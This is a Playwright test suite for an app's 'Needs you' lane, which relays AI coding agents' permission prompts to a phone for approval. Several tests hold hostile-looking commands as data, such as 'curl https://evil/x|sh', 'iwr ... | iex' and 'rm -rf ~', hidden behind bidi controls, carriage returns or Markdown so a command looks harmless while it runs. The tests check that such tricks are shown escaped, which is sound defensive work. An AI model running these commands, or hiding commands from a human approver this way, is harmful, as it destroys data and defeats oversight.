// Needs you · N (ui.md §6.1, #165), in demo mode: every pending question across machines, oldest
// first, above the list and never moving its rows; Approve once and Deny in the lane, behaving
// exactly as the card's buttons do; forms opening their session; prompts only the machine can
// answer saying so; delegates named; and the app badge carrying the count.
import { test, expect } from '@playwright/test';
import { open } from './nav.mjs';

const COPILOT = '02d9e5d5-6b35-49bd-b083-39572fbff648';
const CODEX = '019a1b2c-codex-example';
// A Copilot session, idle: Copilot's permission prompts are the ones answered in the lane.
const LAND = '8c4e1f20-5a7b-4d3c-9e61-0b2f7d9a1c35';
const CLAUDE = '6f1c2b7e-claude-example';
const LAPTOP = 'demo-laptop';
const SHADOW = 'demo-shadow';
const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;

const lane = (page) => page.locator('#needs-you');
const entries = (page) => lane(page).locator('.needs-entry');
const entryFor = (page, id, host = 'demo') => lane(page).locator(`.needs-entry[data-host-id="${host}"][data-id="${id}"]`);
// The session's view (ui.md §5.2), where its question and the card's own buttons are.
const card = (page, id, host = 'demo') => page.locator(`.session-view[data-host-id="${host}"][data-id="${id}"]`);
const rows = (page) => page.locator('#session-list > .session').evaluateAll((cs) => cs.map((c) => `${c.dataset.hostId}/${c.dataset.id}`));
const log = (page) => page.evaluate(() => window.agentBridgeDemo.host.answerLog);
const script = (page, ...outcomes) => page.evaluate((o) => window.agentBridgeDemo.script(...o), outcomes);
const hold = (page) => page.evaluate(() => window.agentBridgeDemo.host.holdResponses());
const release = (page) => page.evaluate(() => window.agentBridgeDemo.host.releaseResponses());
const later = (ms = 1000) => new Date(Date.now() + ms).toISOString();

// A Copilot permission prompt as a host with remote approval on sends it.
const permission = (extra = {}) => ({
  id: 'r1#0123456789abcdef', kind: 'approval', message: 'Allow **shell**?\n\nPush the branch\n\n```\ngit push origin main --force-with-lease\n```',
  fields: [{ name: 'decision', type: 'choice', required: true, options: [{ value: 'approve', label: 'Approve once' }, { value: 'deny', label: 'Deny' }] }],
  ...extra,
});

async function openDemo(page, query = '') {
  await page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__cspViolations.push(`${e.violatedDirective} ${e.blockedURI}`));
    // The Badging API, recorded: Chromium has it only for an installed app, and WebKit not at all.
    window.__badge = [];
    navigator.setAppBadge = (n) => { window.__badge.push(n); return Promise.resolve(); };
    navigator.clearAppBadge = () => { window.__badge.push(0); return Promise.resolve(); };
  });
  await page.goto(`?demo=1&static=1&answerDelay=300${query}`);
  await page.waitForSelector('html[data-demo-ready]');
}

// A session on a machine, asking `question` (askedAt now, unless it says otherwise).
async function ask(page, id, question, { host = 'demo', extra = {} } = {}) {
  await page.evaluate(({ id, host, question, extra, t }) => {
    const d = window.agentBridgeDemo;
    const m = host === 'demo' ? d.host : d.machines[host];
    m.upsert({ ...m.get(id), status: 'waiting', statusSince: t, updatedAt: t, ...extra, question: { kind: 'form', askedAt: t, fields: [], ...question } });
  }, { id, host, question, extra, t: later() });
  await expect(entryFor(page, id, host)).toHaveCount(1);
  await still(page);
  return entryFor(page, id, host);
}

// The lane takes no click for a moment after it changes or comes back on screen (ui.md §5.3,
// Scroll to a question): a test that clicks next clicks as a person would, once it has.
const still = (page) => expect(lane(page).locator('.needs-you-list[data-arriving]')).toHaveCount(0);

test.afterEach(async ({ page }) => {
  expect(await page.evaluate(() => window.__cspViolations ?? [])).toEqual([]);
});

test.describe('on a phone', () => {
  test.use({ viewport: { width: 390, height: 664 }, hasTouch: true });

  test('the lane lists every pending question across machines, oldest first, with its session, machine, agent and first line', async ({ page }) => {
    await openDemo(page, '&machines=3');
    await expect(lane(page)).toBeVisible();
    await expect(lane(page).locator('.needs-you-head')).toHaveText('Needs you · 3');
    // The worked example asked days ago, the shadow's two minutes ago, the laptop's one.
    await expect(entries(page)).toHaveCount(3);
    expect(await entries(page).evaluateAll((es) => es.map((e) => `${e.dataset.hostId}/${e.dataset.id}`)))
      .toEqual([`demo/${COPILOT}`, `${SHADOW}/shadow-ask-1`, `${LAPTOP}/laptop-ask-1`]);
    const laptop = entryFor(page, 'laptop-ask-1', LAPTOP);
    await expect(laptop.locator('.needs-title')).toHaveText('Rotate the test certificates');
    await expect(laptop.locator('.needs-line')).toHaveText('Replace the certificates now?');
    await expect(laptop.locator('.needs-meta')).toHaveText(/^Laptop · Copilot · \d+m$/);
    // A question asked anywhere joins the lane in its place by age; a new one goes last.
    await ask(page, CLAUDE, { id: 'q-new', message: 'Anything else?' });
    await expect(lane(page).locator('.needs-you-head')).toHaveText('Needs you · 4');
    await expect(entries(page).last()).toHaveAttribute('data-id', CLAUDE);
  });

  test('with several machines shown, each control names the machine as well as the session, and the prompt is drawn as written on no tint', async ({ page }) => {
    const message = 'Allow **shell**? It runs `git push`.\n\n```\ngit push origin main\n```';
    await openDemo(page, '&machines=3');
    const e = await ask(page, LAND, permission({ message }));
    await expect(e.getByRole('button', { name: 'Approve once: Land the P1 slices on Demo machine' })).toBeVisible();
    await expect(e.getByRole('button', { name: 'Deny: Land the P1 slices on Demo machine' })).toBeVisible();
    await expect(e.getByRole('button', { name: 'Land the P1 slices on Demo machine: open the session' })).toBeVisible();
    // An approval is drawn exactly as written, fence markers included (#415), and never on a tint
    // over the Needs you fill.
    expect(await e.locator('.needs-prompt').textContent()).toBe(message);
    const backgrounds = await e.locator('.needs-prompt, .needs-prompt *').evaluateAll((els) => els.map((c) => getComputedStyle(c).backgroundColor));
    expect(new Set(backgrounds)).toEqual(new Set(['rgba(0, 0, 0, 0)']));
  });

  test('the lane never moves list rows: a question arriving, being answered and going leaves every row where it was', async ({ page }) => {
    await openDemo(page);
    const before = await rows(page);
    expect(before.indexOf(`demo/${LAND}`)).toBeGreaterThan(0);
    const e = await ask(page, LAND, permission());
    expect(await rows(page)).toEqual(before);
    // The lane sits above the list, apart from it: no row is drawn inside it.
    await expect(lane(page).locator('.session')).toHaveCount(0);
    const laneBox = await lane(page).boundingBox();
    const listBox = await page.locator('#session-list').boundingBox();
    expect(laneBox.y + laneBox.height).toBeLessThanOrEqual(listBox.y);
    await e.getByRole('button', { name: /^Approve once/ }).tap();
    await expect(entryFor(page, LAND)).toHaveCount(0);
    expect(await rows(page)).toEqual(before);
  });

  test('Approve once in the lane sends what the card\'s button sends, the card follows it, and the entry leaves when the question clears', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, LAND, permission());
    await expect(e).toHaveAttribute('data-mode', 'approve');
    await expect(e.locator('.needs-prompt')).toContainText('```\ngit push origin main --force-with-lease\n```');
    // The entry's buttons are its title, Approve once and Deny.
    await expect(e.getByRole('button').and(page.locator('button:not(.md-copy)'))).toHaveText([/./, 'Approve once', 'Deny']);
    await hold(page);
    await e.getByRole('button', { name: /^Approve once/ }).tap();
    // On its way, in the lane and on the card alike: one answer, one service entry.
    await expect(e.locator('.needs-status')).toHaveText('Sending…');
    await expect(e.getByRole('button', { name: /^Deny/ })).toBeDisabled();
    await expect(e.getByRole('button', { name: /^Approve once/ })).toHaveAttribute('aria-pressed', 'true');
    const q = card(page, LAND).locator('.question');
    await expect(q.locator('.answer-status')).toHaveText('Sending…');
    await expect(q.locator('.choice[data-value="deny"]')).toBeDisabled();
    await release(page);
    await expect(entryFor(page, LAND)).toHaveCount(0);
    await expect(card(page, LAND).locator('.answer-receipt')).toHaveText('Your answer: Delivered. The session has your answer.');
    const sent = await log(page);
    expect(sent).toEqual([{ id: LAND, question: 'r1#0123456789abcdef', request: expect.stringMatching(UUID), fields: { decision: 'approve' } }]);
  });

  test('Deny in the lane is the card\'s Deny', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, LAND, permission());
    await e.getByRole('button', { name: /^Deny/ }).tap();
    await expect(entryFor(page, LAND)).toHaveCount(0);
    expect((await log(page))[0].fields).toEqual({ decision: 'deny' });
  });

  test('every control in the lane is at least 44 px tall on a phone', async ({ page }) => {
    await openDemo(page);
    await ask(page, LAND, permission());
    const sizes = await lane(page).locator('button:visible').evaluateAll((bs) => bs.map((b) => ({ what: b.className, h: b.getBoundingClientRect().height })));
    expect(sizes.length).toBeGreaterThanOrEqual(3);
    for (const s of sizes) { expect(s.h, s.what).toBeGreaterThanOrEqual(44); }
  });
});

test.describe('outcomes, as the card\'s buttons have them', () => {
  test.use({ viewport: { width: 390, height: 664 } });

  test('stale says it was already answered or gone, and holds both buttons', async ({ page }) => {
    await openDemo(page);
    await script(page, 'stale');
    const e = await ask(page, LAND, permission());
    await e.getByRole('button', { name: /^Approve once/ }).click();
    await expect(e.locator('.needs-status')).toHaveText('Already answered or gone: the session is no longer asking this.');
    await expect(e).toHaveAttribute('data-answer', 'stale');
    await expect(e.getByRole('button', { name: /^Approve once/ })).toBeDisabled();
    await expect(e.getByRole('button', { name: /^Deny/ })).toBeDisabled();
    await expect(card(page, LAND).locator('.question')).toHaveAttribute('data-answer', 'stale');
  });

  test('refused shows the machine\'s reason, and either button can be pressed again, as a new request', async ({ page }) => {
    await openDemo(page);
    await script(page, { outcome: 'refused', reason: 'the session is running elevated' });
    const e = await ask(page, LAND, permission());
    await e.getByRole('button', { name: /^Approve once/ }).click();
    await expect(e.locator('.needs-status')).toHaveText('The machine refused this answer: the session is running elevated.');
    await expect(e.locator('.needs-status')).toHaveClass(/\bbad\b/);
    // In the text colour, not danger: the roles are checked against the card, not the Needs you fill.
    expect(await e.locator('.needs-status').evaluate((el) => {
      const probe = document.createElement('span');
      probe.style.color = 'var(--ab-text)';
      el.after(probe);
      const text = getComputedStyle(probe).color;
      probe.remove();
      return getComputedStyle(el).color === text;
    })).toBe(true);
    await expect(e.getByRole('button', { name: /^Deny/ })).toBeEnabled();
    // The outcome grew the entry, so the lane waits a moment before a click counts.
    await still(page);
    await e.getByRole('button', { name: /^Deny/ }).click();
    await expect(entryFor(page, LAND)).toHaveCount(0);
    const [first, second] = await log(page);
    expect([first.fields.decision, second.fields.decision]).toEqual(['approve', 'deny']);
    expect(second.request).not.toBe(first.request);
  });

  test('a long reason wraps inside the entry on a phone rather than running off the side', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 664 });
    await openDemo(page);
    await script(page, { outcome: 'refused', reason: `policy ${'x'.repeat(160)}` });
    const e = await ask(page, LAND, permission());
    await e.getByRole('button', { name: /^Approve once/ }).click();
    await expect(e.locator('.needs-status')).toContainText('The machine refused this answer');
    const [status, box] = await Promise.all([e.locator('.needs-status').boundingBox(), lane(page).boundingBox()]);
    expect(status.x + status.width).toBeLessThanOrEqual(box.x + box.width);
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
  });

  test('busy lets you press again after a moment', async ({ page }) => {
    await openDemo(page);
    await script(page, 'busy');
    const e = await ask(page, LAND, permission());
    const approve = e.getByRole('button', { name: /^Approve once/ });
    await approve.click();
    await expect(e.locator('.needs-status')).toHaveText('Another answer to this session is being delivered. Try again in a moment.');
    await expect(approve).toBeDisabled();
    await expect(approve).toBeEnabled({ timeout: 4000 });
    await approve.click();
    await expect(entryFor(page, LAND)).toHaveCount(0);
  });

  test('a send the machine fails offers Try again, which sends the same request again', async ({ page }) => {
    await openDemo(page);
    await script(page, { error: 'the host is restarting' });
    const e = await ask(page, LAND, permission());
    await e.getByRole('button', { name: /^Approve once/ }).click();
    await expect(e.locator('.needs-status')).toHaveText("Couldn't send it: the host is restarting.");
    await expect(e.getByRole('button', { name: /^Approve once/ })).toBeDisabled();
    // Named for its session, as Approve once and Deny are: two failed sends can both offer it.
    // The outcome grew the entry, so the lane waits a moment before a click counts.
    await still(page);
    await e.getByRole('button', { name: 'Try again: Land the P1 slices', exact: true }).click();
    await expect(entryFor(page, LAND)).toHaveCount(0);
    const [first, second] = await log(page);
    expect(second.request).toBe(first.request);
  });

  test('an answer sent from the card shows in the lane too', async ({ page }) => {
    await openDemo(page);
    await script(page, 'stale');
    const e = await ask(page, LAND, permission());
    await open(page, LAND);
    await card(page, LAND).locator('.question .choice[data-value="approve"]').click();
    await card(page, LAND).locator('.back').click();
    await expect(e.locator('.needs-status')).toHaveText('Already answered or gone: the session is no longer asking this.');
    await expect(e.getByRole('button', { name: /^Approve once/ })).toHaveAttribute('aria-pressed', 'true');
  });
});

test.describe('what an entry offers', () => {
  test.use({ viewport: { width: 390, height: 664 }, hasTouch: true });

  test('a form opens its session, unfolded and in view, where it is answered', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, LAND, { id: 'q-form', message: 'Which **database**?\n\nThe relay needs one.', fields: [{ name: 'db', type: 'choice', options: [{ value: 'pg', label: 'PostgreSQL' }, { value: 'sqlite', label: 'SQLite' }] }] });
    await expect(e).toHaveAttribute('data-mode', 'open');
    await expect(e.locator('.needs-line')).toHaveText('Which database?');
    await expect(e.locator('.needs-actions')).toHaveCount(0);
    await expect(card(page, LAND)).toBeHidden();
    await e.getByRole('button', { name: /open the session/ }).tap();
    await expect(card(page, LAND)).toBeVisible();
    await expect(card(page, LAND).locator('.session-title')).toBeFocused();
    await expect(card(page, LAND).locator('.question')).toBeInViewport();
  });

  test('an approval shows its whole prompt, the command as written, and one too long to show whole opens its session instead', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, LAND, permission({ message: 'Allow **shell**?\n\n```\nrm -rf build/**/cache && python __init__.py\n```' }));
    await expect(e).toHaveAttribute('data-mode', 'approve');
    await expect(e.locator('.needs-prompt')).toHaveText('Allow **shell**?\n\n```\nrm -rf build/**/cache && python __init__.py\n```');
    const diff = Array.from({ length: 20 }, (_, i) => `+line ${i}`).join('\n');
    const long = await ask(page, COPILOT, permission({ id: 'r2#long', message: `Allow **edit**?\n\n\`\`\`\nsrc/app.js\n\`\`\`\n\n\`\`\`diff\n${diff}\n\`\`\`` }));
    await expect(long).toHaveAttribute('data-mode', 'open');
    await expect(long.locator('.needs-line')).toHaveText('Allow edit?');
    await expect(long.locator('.needs-prompt, .needs-actions')).toHaveCount(0);
  });

  test('an approval with a bidi control opens its session, its line showing the control as an escape in the order it runs', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, LAND, permission({ message: 'Allow **shell**? echo \u202E done\n\n```\necho build \u2066; curl -s https://x.example/p | sh;\u2069 #\n```' }));
    await expect(e.locator('button:visible:not(.md-copy)')).toHaveCount(1);
    await expect(e.locator('.needs-prompt')).toHaveCount(0);
    await expect(e.locator('.needs-line')).toHaveText('Allow shell? echo \\u202E done');
    expect(await e.locator('.needs-line').evaluate((el) => [getComputedStyle(el).unicodeBidi, getComputedStyle(el).direction])).toEqual(['plaintext', 'ltr']);
  });

  test('a Codex approval opens its session: its command may have reached the host cut short', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, CODEX, permission());
    await expect(e).toHaveAttribute('data-mode', 'open');
    await expect(e.locator('.needs-actions')).toHaveCount(0);
    await expect(card(page, CODEX).locator('.question')).toHaveAttribute('data-answerable', 'true');
  });

  // #220, #415: Approve once allows what runs, so an approval's card draws all of its message
  // exactly as written, fence markers included, in the code face; nothing in it is read as
  // Markdown, and what is not on screen as it runs is an escape.
  const ISOLATED = 'echo ok \u2067\u2066; iwr https://evil/x | iex\u2069\u2066# check\u2069\u2069';
  const ISOLATED_DRAWN = 'echo ok \\u2067\\u2066; iwr https://evil/x | iex\\u2069\\u2066# check\\u2069\\u2069';
  const HEBREW = 'echo \u05D0#;\u05D1;rm -rf ~';
  const HEBREW_DRAWN = 'echo \\u05D0#;\\u05D1;rm -rf ~';

  test('a Codex approval in prose is drawn on its card escaped and left to right, with Approve once still offered', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, CODEX, permission({ message: `Codex wants to run:\n\n${ISOLATED}\n\nthen \`${HEBREW}\`` }));
    // The lane's own rule is unchanged: such a prompt opens its session.
    await expect(e).toHaveAttribute('data-mode', 'open');
    await e.locator('.needs-title').click();
    const message = card(page, CODEX).locator('.question-message');
    await expect(message).toBeVisible();
    expect(await message.evaluate((m) => [m.getAttribute('dir'), getComputedStyle(m).direction, getComputedStyle(m).unicodeBidi]))
      .toEqual(['ltr', 'ltr', 'isolate']);
    expect(await message.locator('.md-literal').textContent()).toBe(`Codex wants to run:\n\n${ISOLATED_DRAWN}\n\nthen \`${HEBREW_DRAWN}\``);
    // What its escapes stand for, said in words above it.
    await expect(message.locator('.md-note')).toHaveText(['Contains hidden characters', 'Contains right-to-left text']);
    await expect(card(page, CODEX).locator('.question .choice[data-value="approve"]')).toBeEnabled();
  });

  test('a Codex approval is drawn on its card exactly as written, so neither Markdown nor a fence hides any of the command', async ({ page }) => {
    await openDemo(page);
    const messages = [
      // A link drew `echo "safe"`; Bash runs the curl.
      'Codex wants to run:\n\necho "[safe](https://a/";curl${IFS}https://evil/x|sh;")"',
      // A code span joined the lines into one comment; Bash runs the second.
      'Codex wants to run:\n\ngit status # `\ncurl https://evil/x|sh # `',
      // An escape hid its backslash, drawing `echo safe # ; curl`.
      'Codex wants to run:\n\necho safe \\# ; curl https://evil/x|sh',
      // Emphasis hid the glob's stars.
      'Codex wants to run:\n\nrm -rf *tmp* ~/x',
      // A line of three backticks is a command substitution in bash: the fence ran its echo's output.
      'Codex wants to run:\n\n```\necho rm -rf ~\n```',
      "Codex wants to run:\n\nbash -c '\n```\necho rm -rf ~\n```\n'",
      // A tilde fence, and a fence never closed, hid their marker lines too.
      'Codex wants to run:\n\n~~~ sh\nls ~\n~~~',
      'Codex wants to run:\n\n```sh\nls\ncurl https://evil/x|sh',
    ];
    let first = true;
    for (const [k, text] of messages.entries()) {
      const e = await ask(page, CODEX, permission({ id: `r${k}#md`, message: text }));
      if (first) { await e.locator('.needs-title').click(); first = false; }
      const message = card(page, CODEX).locator(`.question[data-question="r${k}#md"] .question-message`);
      await expect(message).toBeVisible();
      expect(await message.textContent()).toBe(text);
      await expect(message.locator('a, em, strong, code, pre, br, button')).toHaveCount(0);
      // In the code face, its line breaks where the agent put them.
      await expect(message.locator('p')).toHaveCSS('white-space', 'pre-wrap');
      expect(await message.locator('p').evaluate((p) => getComputedStyle(p).fontFamily)).toBe(await page.evaluate(() => {
        const probe = document.createElement('span');
        probe.style.fontFamily = 'var(--ab-font-mono)';
        document.body.append(probe);
        const mono = getComputedStyle(probe).fontFamily;
        probe.remove();
        return mono;
      }));
      await expect(card(page, CODEX).locator('.question .choice[data-value="approve"]')).toBeEnabled();
    }
  });

  test('a Copilot approval is drawn exactly as written, its fence markers visible, on its card and in the lane', async ({ page }) => {
    await openDemo(page);
    const message = 'Allow **shell**?\n\nPush the branch\n\n```\ngit push origin main --force-with-lease\n```';
    const e = await ask(page, LAND, permission({ message }));
    await expect(e).toHaveAttribute('data-mode', 'approve');
    expect(await e.locator('.needs-prompt').textContent()).toBe(message);
    await e.locator('.needs-title').click();
    expect(await card(page, LAND).locator('.question-message').textContent()).toBe(message);
    await expect(card(page, LAND).locator('.question .choice[data-value="approve"]')).toBeEnabled();
  });

  test('a Copilot intention ending in a backtick line is drawn with it, and the host\'s fence with the command', async ({ page }) => {
    await openDemo(page);
    // The intention's own line of backticks opened a fence the host's closed, so the command drew
    // as text and its backtick lines vanished.
    const message = 'Allow **shell**?\n\nTidy up\n```\n\n```\nrm -rf build\n```\necho done\n```';
    const e = await ask(page, COPILOT, permission({ message }));
    await e.locator('.needs-title').click();
    expect(await card(page, COPILOT).locator('.question-message').textContent()).toBe(message);
  });

  test('a bare carriage return in an approval\'s command is drawn on its card as an escape on its line, and the card says it contains hidden characters', async ({ page }) => {
    await openDemo(page);
    // Bash runs `echo SECOND`; split at the CR, it drew on a line of its own as a comment.
    const e = await ask(page, CODEX, permission({ message: 'Codex wants to run:\r\n\r\necho safe \r#; echo SECOND\r\n\r\n```\r\necho safe \r#; echo SECOND\r\n```' }));
    await e.locator('.needs-title').click();
    const message = card(page, CODEX).locator('.question-message');
    expect(await message.locator('.md-literal').textContent())
      .toBe('Codex wants to run:\n\necho safe \\u000D#; echo SECOND\n\n```\necho safe \\u000D#; echo SECOND\n```');
    await expect(message.locator('.md-note')).toHaveText(['Contains hidden characters']);
    await expect(card(page, CODEX).locator('.question .choice[data-value="approve"]')).toBeEnabled();
  });

  test('an approval\'s card says it contains hidden characters for a PowerShell comment ended by a bare carriage return, and for an isolate', async ({ page }) => {
    await openDemo(page);
    // PowerShell ends a `#` comment at a bare CR: drawn on one line, this still reads as a comment, and runs.
    const e = await ask(page, CODEX, permission({ id: 'r1#cr', message: 'Codex wants to run:\r\n\r\n# just a note\r Write-Output RAN' }));
    await e.locator('.needs-title').click();
    const cr = card(page, CODEX).locator('.question[data-question="r1#cr"] .question-message');
    expect(await cr.locator('.md-literal').textContent()).toBe('Codex wants to run:\n\n# just a note\\u000D Write-Output RAN');
    await expect(cr.locator('.md-note')).toHaveText(['Contains hidden characters']);
    await ask(page, CODEX, permission({ id: 'r2#rli', message: `Codex wants to run:\n\n${ISOLATED}` }));
    const rli = card(page, CODEX).locator('.question[data-question="r2#rli"] .question-message');
    await expect(rli.locator('.md-note')).toHaveText(['Contains hidden characters']);
    // A message with neither says nothing.
    await ask(page, CODEX, permission({ id: 'r3#plain', message: 'Codex wants to run:\n\ngit status\n' }));
    await expect(card(page, CODEX).locator('.question[data-question="r3#plain"] .question-message .md-literal')).toBeVisible();
    await expect(card(page, CODEX).locator('.question[data-question="r3#plain"] .md-notes')).toHaveCount(0);
  });

  test('an approval\'s card draws a CRLF as the line ending it is, and says it contains hidden characters for its CR', async ({ page }) => {
    await openDemo(page);
    // #423: bash takes the CR as part of the command: `cd` fails on `scratch\r`, and `rm` runs where it is.
    const e = await ask(page, CODEX, permission({ message: 'Codex wants to run:\r\n\r\ncd /tmp/scratch\r\nrm -rf ./*' }));
    await e.locator('.needs-title').click();
    const message = card(page, CODEX).locator('.question-message');
    expect(await message.locator('.md-literal').textContent()).toBe('Codex wants to run:\n\ncd /tmp/scratch\nrm -rf ./*');
    await expect(message.locator('.md-note')).toHaveText(['Contains hidden characters']);
  });

  test('an approval\'s card has no Copy, while a code block in the conversation still has one', async ({ page }) => {
    await openDemo(page);
    // Copy would take the whole message, fence lines too, and bash runs a line of backticks.
    const e = await ask(page, CODEX, permission({ message: 'Codex wants to run:\n\n```\ngit status\n```' }));
    await e.locator('.needs-title').click();
    const view = card(page, CODEX);
    await expect(view.locator('.question-message .md-literal')).toBeVisible();
    await expect(view.locator('.question-message').getByRole('button', { name: 'Copy code' })).toHaveCount(0);
    await page.evaluate(({ id, t }) => {
      const d = window.agentBridgeDemo;
      const s = d.host.get(id);
      d.upsert({ ...s, updatedAt: t, activity: { ...s.activity, response: 'Then:\n\n```\nnpm test\n```' } });
    }, { id: CODEX, t: later() });
    await expect(view.locator('.response pre code')).toHaveText('npm test');
    await expect(view.locator('.response').getByRole('button', { name: 'Copy code' })).toHaveCount(1);
  });

  test('a prompt only the machine can answer says so, with no controls', async ({ page }) => {
    await openDemo(page, '&approve=0');
    const e = await ask(page, COPILOT, permission({ answerAtMachine: true }));
    await expect(e).toHaveAttribute('data-mode', 'atMachine');
    await expect(e.locator('.needs-at-machine')).toHaveText('Answer at the machine');
    await expect(e.locator('.needs-actions, .needs-approve, .needs-deny')).toHaveCount(0);
    // Nothing that answers: opening the session, and copying the command, are all it offers.
    await expect(e.getByRole('button').and(page.locator('button:not(.md-copy)'))).toHaveCount(1);
  });

  test('a delegate\'s question is labelled with the delegate\'s name', async ({ page }) => {
    await openDemo(page);
    const e = await ask(page, LAND, permission({ agent: 'agent-7' }), {
      extra: { waitingOn: 'agent-7', subagents: [{ id: 'agent-7', kind: 'background', status: 'waiting', name: 'Read witness shell logic' }] },
    });
    await expect(e.locator('.needs-delegate')).toHaveText('Delegate Read witness shell logic asks');
    await expect(e.locator('.needs-meta')).toHaveText(/^Copilot · Delegate Read witness shell logic asks · \d+s$/u);
  });
});

test.describe('the badge', () => {
  test.use({ viewport: { width: 390, height: 664 } });

  test('the app badge carries the lane\'s count, and clears when nothing needs you', async ({ page }) => {
    await openDemo(page);
    await expect(lane(page).locator('.needs-you-head')).toHaveText('Needs you · 1');
    await expect.poll(() => page.evaluate(() => window.__badge.at(-1))).toBe(1);
    const e = await ask(page, LAND, permission());
    await expect(lane(page).locator('.needs-you-head')).toHaveText('Needs you · 2');
    await expect.poll(() => page.evaluate(() => window.__badge.at(-1))).toBe(2);
    await e.getByRole('button', { name: /^Approve once/ }).click();
    await expect(entries(page)).toHaveCount(1);
    await expect.poll(() => page.evaluate(() => window.__badge.at(-1))).toBe(1);
    await page.evaluate((id) => { const d = window.agentBridgeDemo; d.upsert({ ...d.host.get(id), status: 'idle', question: null, updatedAt: new Date().toISOString() }); }, COPILOT);
    await expect(lane(page)).toBeHidden();
    await expect.poll(() => page.evaluate(() => window.__badge.at(-1))).toBe(0);
  });
});

for (const width of [390, 900, 1440]) {
  test.describe(`at ${width} px`, () => {
    test.use({ viewport: { width, height: 900 } });

    test('the lane sits above the list at full width, nothing in it overflows, and its controls are big enough', async ({ page }) => {
      await openDemo(page, '&machines=3');
      // A delegate's name with no spaces must wrap, not push the lane wider than the screen.
      const long = 'Read_the_witness_shell_logic_and_the_whole_fixture_tree_before_changing_anything';
      await ask(page, LAND, permission({ agent: 'agent-7' }), { extra: { waitingOn: 'agent-7', subagents: [{ id: 'agent-7', kind: 'task', status: 'waiting', name: long }] } });
      for (const m of await lane(page).locator('.needs-meta').all()) { expect(await m.evaluate((el) => el.scrollWidth <= el.clientWidth + 1)).toBe(true); }
      const laneBox = await lane(page).boundingBox();
      const listBox = await page.locator('#session-list').boundingBox();
      expect(laneBox.y + laneBox.height).toBeLessThanOrEqual(listBox.y);
      expect(Math.round(laneBox.width)).toBeGreaterThanOrEqual(Math.round(listBox.width) - 1);
      const over = await lane(page).evaluate((l) => [...l.querySelectorAll('*')].filter((e) => e.scrollWidth > e.clientWidth + 1 && getComputedStyle(e).overflowX !== 'visible').length);
      expect(over).toBe(0);
      expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
      for (const b of await lane(page).locator('button:visible').all()) { expect((await b.boundingBox()).height).toBeGreaterThanOrEqual(32); }
    });
  });
}

// Needs you's answers take no pointer click for a moment after the lane changes or comes back on
// screen, as a question's do (ui.md §5.3, Scroll to a question): an entry arriving, going or
// moving can put Approve once under a click aimed at what was there. A key acts at once.
test.describe('a moment before the lane takes a click', () => {
  test.use({ viewport: { width: 1440, height: 900 } });

  test('Approve once takes no click as another entry comes, nor as Sessions comes back, and a key acts at once', async ({ page }) => {
    await openDemo(page);
    await ask(page, LAND, permission());
    const answers = async () => (await log(page)).length;
    const before = await answers();
    const press = (land, { detail = 1, change = null } = {}) => page.evaluate(async ({ land, detail, change }) => {
      const d = window.agentBridgeDemo;
      if (change === 'ask') {
        const t = new Date(Date.now() + 5000).toISOString();
        d.host.upsert({ ...d.host.get('6f1c2b7e-claude-example'), status: 'waiting', statusSince: t, updatedAt: t,
          question: { id: 'q-lane-2', kind: 'form', message: 'Which?', askedAt: t, fields: [{ name: 'answer', type: 'choice', options: [{ value: 'a' }, { value: 'b' }] }] } });
      } else if (change === 'sessions') {
        document.querySelector('#nav [data-nav="sessions"]').dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, detail: 1 }));
      }
      await new Promise((r) => setTimeout(r, 0));
      const b = document.querySelector(`#needs-you .needs-entry[data-id="${land}"] .needs-approve`);
      if (!b || b.disabled) { return null; }
      const armed = b.closest('.needs-you-list').hasAttribute('data-arriving');
      b.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, detail }));
      return armed;
    }, { land, detail, change });

    // Another question asks, its entry joins the lane, and a click lands on Approve once.
    expect(await press(LAND, { change: 'ask' })).toBe(true);
    await expect(entryFor(page, CLAUDE)).toHaveCount(1);
    await page.waitForTimeout(100);
    expect(await answers()).toBe(before);
    // Back on Sessions from another page, a click already on its way.
    await page.locator('#nav [data-nav="settings"]').click();
    await expect(page.locator('[data-route="settings"]')).toBeVisible();
    await page.waitForTimeout(600);
    expect(await press(LAND, { change: 'sessions' })).toBe(true);
    await page.waitForTimeout(100);
    expect(await answers()).toBe(before);
    // A key's press (detail 0) is meant for what has focus, and acts at once, guard or none.
    await page.locator('#nav [data-nav="settings"]').click();
    await expect(page.locator('[data-route="settings"]')).toBeVisible();
    expect(await press(LAND, { detail: 0, change: 'sessions' })).toBe(true);
    await expect.poll(answers).toBe(before + 1);
  });

  test('an entry that grows as its answer goes moves those after it, and the lane takes no click for a moment', async ({ page }) => {
    await openDemo(page);
    await ask(page, LAND, permission());
    await ask(page, COPILOT, permission({ id: 'r2#fedcba9876543210' }));
    await expect(entries(page)).toHaveCount(2);
    // The first entry answered by a key (which waits for nothing): its status appears beneath its
    // buttons and the entry grows, moving the next one down. A frame later, a click lands on the
    // second entry's Approve once.
    const second = await page.evaluate(async () => {
      const [a, b] = document.querySelectorAll('#needs-you .needs-entry');
      a.querySelector('.needs-approve').dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, detail: 0 }));
      await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
      const grew = !a.querySelector('.needs-status').hidden;
      b.querySelector('.needs-approve').dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, detail: 1 }));
      return { grew, id: b.dataset.id };
    });
    expect(second.grew).toBe(true);
    await page.waitForTimeout(100);
    // The first went; the second didn't.
    expect((await log(page)).map((x) => x.id)).not.toContain(second.id);
    expect((await log(page)).length).toBe(1);
    // A note above the lane growing moves the whole lane down: the same wait.
    await still(page);
    const pushed = await page.evaluate(async (id) => {
      const note = document.getElementById('host-state');
      note.textContent = 'Demo machine is reconnecting. Its sessions stay as they were until it is back, with everything that waits on it.';
      note.hidden = false;
